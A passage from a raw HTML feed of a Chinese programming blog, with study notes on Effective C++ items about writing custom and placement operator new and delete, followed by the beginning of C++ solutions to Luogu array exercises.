href="#Understand-when-it-makes-sense-to-replace-new-and-delete" class="headerlink" title="Understand  when it makes sense to replace new and delete"></a>Understand  when it makes sense to replace new and delete</h3><p>替换默认new和delete的理由：</p><ul><li>用来检测运行上的错误：<code>new</code>时我们可以在客户所得区块边界添加特定的<code>byte patterns(签名)</code>,在<code>delete</code>我们可以检测标记，判断对分配的内存的操作是否越界。</li><li>为了强化效能：默认的operator new 和operator delete 主要用于一般目的，它们不但可被长时间执行的程序（例如网页服务器， web servers) 接受，也可被执行时间少于一秒的程序接受。它们必须处理一系列需求，包括大块内存、小块内存、大小混合型内存。它们必须接纳各种分配形态，范围从程序存活期间的少量区块动态分配，到大数量短命对象的持续分配和归还。它们必须考虑破碎问题C fragmentation) ，这最终会导致程序无法满足大区块内存要求，即使彼时有总量足够但分散为许多小区块的自由内存。<code>它们的工作对每个人都是适度地好，但不对特定任何人有最佳表现。定制版之operator new 和operator delete 性能胜过缺省版本。</code></li><li>为了收集使用上的统计数据：在一头栽进定制型news 和定制型deletes 之前，理当先收集你的软件如何使用其动态内存。分配区块的大小分布如何？寿命分布如何？它们倾向于以FIFO （先进先出）次序或LIFO （后进先出）次序或随机次序来分配和归还？它们的运用型态是否随时间改变，也就是说你的软件在不同的执行阶段有不同的分配／归还形态吗？任何时刻所使用的最大动态分配量（高水位）是多少？自行定义opera七or new 和operator delete 使我们得以轻松收集到这些信息。</li></ul><p>这些我们可以通过使用成熟的第三方库或者工具解决。</p><ul><li>增加分配和归还的速度：例如如果你的程序是单线程的，那么你可以使用不具备线程安全的分配器来提升速度。</li><li>为了降低缺省内存管理器带来的空间额外开销。泛用型内存管理器往往（虽然并非总是）不只比定制型慢，它们往往还使用更多内存。</li><li>为了弥补缺省分配器中的非最佳齐位C suboptimal alignment) 。在C++11， 已经解决了这一问题。</li><li>为了将相关对象成簇集中。如果你知道特定之某个数据结构往往被一起使用，而你又希望在处理这些数据时将“内存页错误”(page faults) 的频率降全最低，那么为此数据结构创建另一个heap 就有意义，这么一来它们就可以被成簇集中<br>在尽可能少的内存页(pages) 上。<code>（即增加缓存命中的几率）</code>new 和delete 的“placement 版本” （见条款52) 有可能完成这样的集簇行为。</li><li>获得非传统的行为。 有时候你会希望operators new 和delete 做编译器附带版没做的某些事情。例如你可能会希望分配和归还共享内存(shared memory)内的区块，但唯一能够管理该内存的只有CAPI 函数，那么写下一个定制版new和delete （很可能是placement 版本，见条款52) ，你便得以为CAPI 穿上一件C++ 外套。你也可以写一个自定的operator delete, 在其中将所有归还内存内容覆盖为o, 藉此增加应用程序的数据安全性。</li></ul><h4 id="请记住-1"><a href="#请记住-1" class="headerlink" title="请记住"></a>请记住</h4><ul><li>有许多理由需要写个自定的new 和delete, 包括改善效能、对heap 运用错误进行调试、收集heap 使用信息。</li></ul><h3 id="51-Adhere-to-convention-when-writing-new-and-delete"><a href="#51-Adhere-to-convention-when-writing-new-and-delete" class="headerlink" title="51. Adhere to convention when writing new and delete."></a>51. Adhere to convention when writing new and delete.</h3><p><strong>new:</strong></p><ul><li>实现一致性operator new 必得返回正确的值，内存不足时必得调用new-handling 函数（见条款49) ，必须有对付零内存需求的准备，还需避免不慎掩盖正常形式的new。</li><li>如果它有能力供应客户申请的内存，就返回一个指针指向那块内存。如果没有那个能力，就遵循条款49 描述的规则，并抛出一个<code>bad_alloc</code>异常。</li><li>operator new 实际上不只一次尝试分配内存，并在每次失败后调用new-handling 函数。这里假设new-handling 函数也许能够做某些动作将某些内存释放出来。只有当指向new-handling 函数的指针是null。operator new 才会抛出异常。</li><li>C++规定，即使客户要求0 bytes, opera七or new 也得返回一个合法指针。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> * <span class="keyword">operator</span> <span class="title">new</span><span class="params">(std::<span class="type">size_t</span> size)</span> <span class="title">throw</span><span class="params">(std::bad_alloc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (size == <span class="number">0</span>) &#123;<span class="comment">//0 bytes 申请量视为1 byte 申请量</span></span><br><span class="line">    size = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 循环尝试分配 size 字节的内存</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="comment">// 尝试分配 size 字节的内存</span></span><br><span class="line">    _attempt to allocate size bytes;_</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果分配成功，则返回指向内存的指针</span></span><br><span class="line">    <span class="keyword">if</span> (_the allocation was successful_)</span><br><span class="line">       <span class="keyword">return</span> (_a pointer to the memory_);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果分配失败，则处理内存不足的情况</span></span><br><span class="line">    <span class="comment">// 获取当前的 new-handling 函数</span></span><br><span class="line">    new_handler globalHandler = <span class="built_in">set_new_handler</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 重新设置 new-handling 函数</span></span><br><span class="line">    <span class="built_in">set_new_handler</span>(globalHandler);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果存在全局的 new-handling 函数，则调用它</span></span><br><span class="line">    <span class="keyword">if</span> (globalHandler) (*globalHandler)();</span><br><span class="line">    <span class="comment">// 否则抛出 std::bad_alloc 异常</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">throw</span> std::<span class="built_in">bad_alloc</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>只有在以下情况才能终止循环：内存被成功分配或new-handling 函数做了一件描述于条款49 的事情：让更多内存可用、安装另一个new-handler 、卸除new-handler 、抛出bad_alloc 异常（或其派生物），或是承认失败而直接return 。</p><p>注意operator new 成员函数会被derived classes 继承，子类大小和父类大小不一致时可能引发错误</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="comment">// 声明静态的 operator new 函数，用于动态分配内存</span></span><br><span class="line">  <span class="function"><span class="type">static</span> <span class="type">void</span> * <span class="keyword">operator</span> <span class="title">new</span><span class="params">(std::<span class="type">size_t</span> size)</span> <span class="title">throw</span><span class="params">(std::bad_alloc)</span></span>;</span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Derived</span>: <span class="keyword">public</span> Base                <span class="comment">// Derived doesn&#x27;t declare</span></span><br><span class="line">&#123; ... &#125;;                                  <span class="comment">// operator new</span></span><br><span class="line"></span><br><span class="line">Derived *p = <span class="keyword">new</span> Derived;                 <span class="comment">// 调用 Base::operator new!</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>那么我们只需在基类中加入对类型大小的判断，注意我们去掉了对分配大小为0的判断，因为已经交由标准的 operator new 处理。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> * Base::<span class="keyword">operator</span> <span class="title">new</span><span class="params">(std::<span class="type">size_t</span> size)</span> <span class="title">throw</span><span class="params">(std::bad_alloc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// 如果请求的大小不等于 Base 类对象的大小</span></span><br><span class="line">  <span class="keyword">if</span> (size != <span class="built_in">sizeof</span>(Base))               </span><br><span class="line">    <span class="comment">// 则交由标准的 operator new 处理请求</span></span><br><span class="line">    <span class="keyword">return</span> ::<span class="keyword">operator</span> <span class="built_in">new</span>(size);         </span><br><span class="line"></span><br><span class="line">  <span class="comment">// 否则在这里处理请求</span></span><br><span class="line">  ...                                     </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>//TODO 类的new[]</p><p><strong>delete：</strong></p><ul><li>C+＋保证“删除null 指针永远安全”，所以你必须兑现这项保证。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="keyword">operator</span> <span class="title">delete</span><span class="params">(<span class="type">void</span> *rawMemory)</span> <span class="title">throw</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// 如果要删除的是空指针，则什么也不做</span></span><br><span class="line">  <span class="keyword">if</span> (rawMemory == <span class="number">0</span>) <span class="keyword">return</span>;           </span><br><span class="line"></span><br><span class="line">  <span class="comment">// 释放 rawMemory 指向的内存</span></span><br><span class="line">  _deallocate the memory pointed to by rawMemory;_</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成员函数还要检测对象大小是否等于 Base 类对象的大小:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="comment">// 声明静态的 operator new 和 operator delete 函数</span></span><br><span class="line">  <span class="function"><span class="type">static</span> <span class="type">void</span> * <span class="keyword">operator</span> <span class="title">new</span><span class="params">(std::<span class="type">size_t</span> size)</span> <span class="title">throw</span><span class="params">(std::bad_alloc)</span></span>;</span><br><span class="line">  <span class="function"><span class="type">static</span> <span class="type">void</span> <span class="keyword">operator</span> <span class="title">delete</span><span class="params">(<span class="type">void</span> *rawMemory, std::<span class="type">size_t</span> size)</span> <span class="title">throw</span><span class="params">()</span></span>;</span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> Base::<span class="keyword">operator</span> <span class="title">delete</span><span class="params">(<span class="type">void</span> *rawMemory, std::<span class="type">size_t</span> size)</span> <span class="title">throw</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// 检查是否为 null 指针</span></span><br><span class="line">  <span class="keyword">if</span> (rawMemory == <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果请求的大小不等于 Base 类对象的大小</span></span><br><span class="line">  <span class="keyword">if</span> (size != <span class="built_in">sizeof</span>(Base)) &#123;</span><br><span class="line">    <span class="comment">// 则交由标准的 operator delete 函数处理请求</span></span><br><span class="line">    ::<span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(rawMemory)</span></span>;</span><br><span class="line">    <span class="keyword">return</span>; <span class="comment">// 结束函数执行</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 在这里释放 rawMemory 指向的内存</span></span><br><span class="line">  _deallocate the memory pointed to by rawMemory;_</span><br><span class="line">  <span class="keyword">return</span>; <span class="comment">// 结束函数执行</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果即将被删除的对象派生自某个base class 而后者欠缺virtual 析构函数，那么C+＋传给operator delete 的size_t 数值可能不正确。这是“让你的base classes 拥有virtual 析构函数”的一个够好的理由。此刻只要你提高警觉，如果你的base classes 遗漏virtual析构函数， operator delete 可能无法正确运作。</p><p>请记住：</p><ul><li>operator new 应该内含一个无穷循环，并在其中尝试分配内存，如果它无法满足内存需求，就该调用new-handler 。它也应该有能力处理0 bytes 申请。Class专属版本则还应该处理”比正确大小更大的（错误）申请”。</li><li>operator delete 应该在收到null 指针时不做任何事。Class 专属版本则还应该处理“比正确大小更大的（错误）申请”。</li></ul><h3 id="52-Write-placement-delete-if-you-write-placement-new"><a href="#52-Write-placement-delete-if-you-write-placement-new" class="headerlink" title="52. Write placement delete if you write placement new."></a>52. Write placement delete if you write placement new.</h3><p>考虑如下例子</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Widget* pw = <span class="keyword">new</span> Widget;</span><br></pre></td></tr></table></figure><p>假设其中第一个函数调用成功，第二个函数却抛出异常。既然那样，步骤一的内存分配所得必须取消并恢复旧观，否则会造成<code>内存泄漏(memory leak)</code>。</p><p>当你只使用正常形式的new 和delete, 运行期系统毫无问题可以找出那个“知道如何取消new 所作所为并恢复旧观”的delete 。然而当你开始声明非正常形式的operator new, 也就是带有附加参数的operator new, “究竟哪一个delete 伴随这个new” 的问题便浮现了。</p><p>什么是<code>placement new和placement delete</code>？</p><ul><li>placement new：即除了<code>size_t</code>还有其他参数。</li><li>placement delete：直接派生自placement new。即除了<code>size_t</code>还有其他参数。</li></ul><p>为什么我们要提起说placement delete直接派生自placement new？：</p><ul><li>如果一个带额外参数的operator new 没有“带相同额外参数”的对应版operator delete, 那么当new 的内存分配动作需要取消并恢复旧观时就没有任何operator delete 会被调用。因此，为了消除稍早代码中的内存泄漏，Widget 有必要声明一个placement delete。</li></ul><p>我们使用一个ostream来记录分配信息：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Widget</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"> </span><br><span class="line">  <span class="function"><span class="type">static</span> <span class="type">void</span>* <span class="keyword">operator</span> <span class="title">new</span><span class="params">(std::<span class="type">size_t</span> size, std::ostream&amp; logStream)</span></span></span><br><span class="line"><span class="function">    <span class="title">throw</span><span class="params">(std::bad_alloc)</span></span>;</span><br><span class="line">   <span class="comment">//声明placement new</span></span><br><span class="line">  <span class="function"><span class="type">static</span> <span class="type">void</span> <span class="keyword">operator</span> <span class="title">delete</span><span class="params">(<span class="type">void</span> *pMemory)</span> <span class="title">throw</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">static</span> <span class="type">void</span> <span class="keyword">operator</span> <span class="title">delete</span><span class="params">(<span class="type">void</span> *pMemory, std::ostream&amp; logStream)</span> <span class="title">throw</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="comment">//我们还需要声明placement delete</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Widget* pw = <span class="built_in">new</span> (std::cerr) Widget;<span class="comment">//这里不会发生内存泄露</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> pw <span class="comment">//调用正常的operator delete；</span></span><br></pre></td></tr></table></figure><p><code>delete pw</code>调用正常的operator delete。placement delete 只有在“伴随placement new 调用而触发的构造函数”出现异常时才会被调用。</p><p>这意味着我们必须同时提供一个正常的operator delete （用于构造期间无任何异常被抛出）和一个placement<br>版本（用于构造期间有异常被抛出）。后者的额外参数必须和operator new 一样。</p><h4 id="名称掩盖"><a href="#名称掩盖" class="headerlink" title="名称掩盖"></a>名称掩盖</h4><p>因为 member function（成员函数）的名字会覆盖外围的具有相同名字的函数Item 33，你需要小心避免用 class-specific（类专用）的 news 覆盖你的客户所希望看到的其它 news（包括其常规版本）。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">static</span> <span class="type">void</span>* <span class="keyword">operator</span> <span class="title">new</span><span class="params">(std::<span class="type">size_t</span> size, std::ostream&amp; logStream)</span></span></span><br><span class="line"><span class="function">    <span class="title">throw</span><span class="params">(std::bad_alloc)</span></span>;</span><br><span class="line">  <span class="comment">// 这个自定义的 new 操作符接受一个额外的 std::ostream 引用参数，</span></span><br><span class="line">  <span class="comment">// 并且隐藏了标准的全局 new 操作符。如果内存分配失败，会抛出 std::bad_alloc 异常。</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Base *pb = <span class="keyword">new</span> Base;                        </span><br><span class="line"><span class="comment">// 错误！标准形式的 operator new 被隐藏了。</span></span><br><span class="line"></span><br><span class="line">Base *pb = <span class="built_in">new</span> (std::cerr) Base;         </span><br><span class="line"><span class="comment">// 正确，调用 Base 类中定义的带额外参数的 placement new。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在派生类上也是如此：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Derived</span>: <span class="keyword">public</span> Base &#123;                   <span class="comment">// 从上面的 Base 类继承</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">static</span> <span class="type">void</span>* <span class="keyword">operator</span> <span class="title">new</span><span class="params">(std::<span class="type">size_t</span> size)</span>  <span class="comment">// 重新声明标准形式的 new</span></span></span><br><span class="line"><span class="function">      <span class="title">throw</span><span class="params">(std::bad_alloc)</span></span>;                   <span class="comment">// 如果内存分配失败，将抛出 std::bad_alloc 异常</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Derived *pd = <span class="built_in">new</span> (std::clog) Derived;         <span class="comment">// 错误！Base 类的带参数的 placement new 被隐藏</span></span><br><span class="line"><span class="comment">// 试图使用 Base 类中定义的带 std::ostream 参数的 new 操作符来创建 Derived 对象时失败，</span></span><br><span class="line"><span class="comment">// 因为 Derived 类中重新声明的标准 new 操作符覆盖了它。</span></span><br><span class="line"></span><br><span class="line">Derived *pd = <span class="keyword">new</span> Derived;                     <span class="comment">// 正确，调用 Derived 类的 operator new</span></span><br><span class="line"><span class="comment">// 这行代码使用了 Derived 类重新声明的标准形式的 new 操作符来创建对象，是合法的操作。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果想使用全局的new和delete参见条款33，使用<code>作用域操作符</code>或<code>using声明</code>。    </p><h4 id="请记住-2"><a href="#请记住-2" class="headerlink" title="请记住"></a>请记住</h4><ul><li>当你写一个placement operator new, 请确定也写出了对应的placement operator delete 。如果没有这样做，你的程序可能会发生隐微而时断时续的内存泄漏。</li><li>当你声明placement new 和placement delete, 请确定不要无意识（非故意）地遮掩了它们的正常版本。</li></ul>]]></content>
      
      
      <categories>
          
          <category> cpp </category>
          
          <category> effective cpp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> effective cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>洛谷题单——数组</title>
      <link href="/2024/04/28/%E7%AE%97%E6%B3%95/%E6%B4%9B%E8%B0%B7%E6%95%B0%E7%BB%84/"/>
      <url>/2024/04/28/%E7%AE%97%E6%B3%95/%E6%B4%9B%E8%B0%B7%E6%95%B0%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h3 id="P1428-小鱼比可爱"><a href="#P1428-小鱼比可爱" class="headerlink" title="P1428 小鱼比可爱"></a>P1428 小鱼比可爱</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240428213943899.png" alt="image-20240428213943899"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">105</span>;</span><br><span class="line"><span class="type">int</span> a[N];</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">cin &gt;&gt; a[i];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; i; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (a[i] &gt; a[j])</span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; count &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="P1427-小鱼的数字游戏"><a href="#P1427-小鱼的数字游戏" class="headerlink" title="P1427 小鱼的数字游戏"></a>P1427 小鱼的数字游戏</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240428230234332.png" alt="image-20240428230234332"></p><p>看到的优秀题解，方便你快速过一遍知识：<a href="https://www.luogu.com.cn/article/wcdtmhz9">一个红题带你了解绿（黄）题知识点 - 洛谷专栏 (luogu.com.cn)</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">105</span>;</span><br><span class="line"><span class="type">int</span> a[N];</span><br><span class="line">stack&lt;<span class="type">int</span>&gt; st;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> tmp;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">cin &gt;&gt; tmp;</span><br><span class="line"><span class="keyword">if</span> (tmp == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">st.<span class="built_in">push</span>(tmp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (!st.<span class="built_in">empty</span>())</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; st.<span class="built_in">top</span>() &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">st.<span class="built_in">pop</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="P5727-【深基5-例3】冰雹猜想"><a href="#P5727-【深基5-例3】冰雹猜想" class="headerlink" title="P5727 【深基5.例3】冰雹猜想"></a>P5727 【深基5.例3】冰雹猜想</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240514193755513.png" alt="image-20240514193755513"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">10005</span>;</span><br><span class="line"><span class="type">int</span> a[N];</span><br><span class="line">stack&lt;<span class="type">int</span>&gt; st;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line">st.<span class="built_in">push</span>(n);</span><br><span class="line"><span class="keyword">while</span> (n != <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (n % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">n = n / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">n = n * <span class="number">3</span> + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">st.<span class="built_in">push</span>(n);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (!st.<span class="built_in">empty</span>())</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; st.<span class="built_in">top</span>() &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">st.<span class="built_in">pop</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="P1047-NOIP2005-普及组-校门外的树"><a href="#P1047-NOIP2005-普及组-校门外的树" class="headerlink" title="P1047 [NOIP2005 普及组] 校门外的树"></a>P1047 [NOIP2005 普及组] 校门外的树</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240429175906480.png" alt="image-20240429175906480"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 